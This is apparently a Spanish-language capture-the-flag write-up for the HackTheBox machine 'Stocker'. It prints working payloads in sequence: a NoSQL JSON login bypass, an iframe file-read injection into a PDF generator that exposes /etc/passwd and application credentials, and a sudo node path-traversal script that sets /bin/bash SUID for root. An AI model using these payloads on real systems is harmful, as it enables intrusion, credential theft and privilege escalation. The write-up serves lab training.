---
layout: single
title: Stocker - HackTheBox
excerpt: " Stocker is an easy level machine in which we abuse nosql payloads with JSON, and which contains privilege escalation abusing javascript code. "
date: 2023-01-10
classes: wide
header:
  teaser: /blog/assets/images/htb-writeup-stocker/stocker.jpg
  teaser_home_page: true
  icon: /blog/assets/images/htb.webp
categories:
  - hackthebox
tags:
  - mongodb
  - javascript
  - ssh
---

"Stocker" is an easy level machine in which we abuse nosql payloads with JSON, and which contains privilege escalation abusing javascript code.

# Summary
- IP: 10.129.135.230
- Ports: 22,80
- OS: Linux (Ubuntu)
- Services & Applications:
	-  22 -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
	-  80 -> nginx 1.18.0

# Recon
- Reconocimiento básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.116.216 -oG allPorts
``` 

- Reconocimiento profundo de puertos encontrados:

```bash
$sudo nmap -p22,80 -sCV 10.10.116.216 -oN targeted
``` 

- Análisis de directorios web con gobuster:

```bash
$gobuster dir -u stocker.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 200
```

- No encontramos nada relevante, así que buscando si hay subdominios por detrás:

```bash
$gobuster vhost -u stocker.htb -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 200
```

- Encontramos el subdomino "dev.stocker.htb" accedemos y vemo un panel de login; intentamos bypassear con SQLi pero no funciona, así que intentamos con payloads NoSQL; como ninguna se ejecuta, probamos inyectar código json con ayuda de burpsuite en el repeater, primero ejecutando el siguiente payload:

#### Autenticación Bypass con Json: (Content-Type: application/json)

```json
#in JSON

{"username": {"$ne": null}, "password": {"$ne": null} }

```

- Nos redirecciona a "/stocks", en donde podemos elegir productos al carrito y recibir un comprobando de los productos comprados en forma de PDF, este procesamiento de texto al PDF nos redirecciona a "/api/códigodecompra" lo que nos hace sospechar de algún api del cual podríamos aprovechar para inyectar comandos y tener un LFI; buscamos en HackTricks ataque "XSS (Dynamic PDF)" y encontramos lo siguiente:

```html
To read local file:

<iframe src=file:///etc/passwd width=800px height=1000px ></iframe>
```

- Interceptamos con burpsuite a la hora de emitir el comprobando del carrito de compra para verificar los campos que procesan el pdf e inyectamos el anterior comando en el título de alguno de los productos:

```html
"title":"<iframe src=file:///etc/passwd width=800px height=1000px ></iframe>",
```

- Vemos el archivo /etc/passwd, confirmando así  el LFI y enumerando los usuarios existentes en el servidor; ahora como sabemos que el subdominio es "dev" podemos imaginar que existirá un directorio "/var/www/dev/index.js" el cual comúnmente contiene información relevante como la de la base de datos que opera por detrás, así que de la misma forma examinamos este archivo:

```html
"title":"<iframe src=file:///var/www/dev/index.js width=800px height=1000px ></iframe>",
```

- Comprobamos que existe el archivo "index.js" y vemos que hay una credencial que parece corresponder a la base de datos MongoDB; probamos esta credencial para acceder por SSH como el usuario "angoose" por si existe reutilización de contraseñas:

```bash
$ssh angoose@10.129.135.230
```

- Entramos y vemos la primera flag.

# Escalando privilegios:


- Comprobamos privilegios como sudoers y vemos que podemos ejecutar el siguiente binario:

```
/usr/bin/node /usr/local/scripts/*.js
```

- Es decir, podemos ejecutar el binario "node" como root, para ejecutar cualquier archivo .js ubicado en el directorio "/usr/local/scripts/", sabiendo esto, podríamos crear un script .js que modifique los permisos de la bash a SUID para posteriormente ejecutarlo con privilegios de root:

```
nano pwned.js
```

```js
require('child_process').exec('chmod u+s /bin/bash')
```

```bash
sudo node /usr/local/scripts/../../../home/angoose/pwned.js
```

- Comprobamos que somos root y obtenemos la última flag.
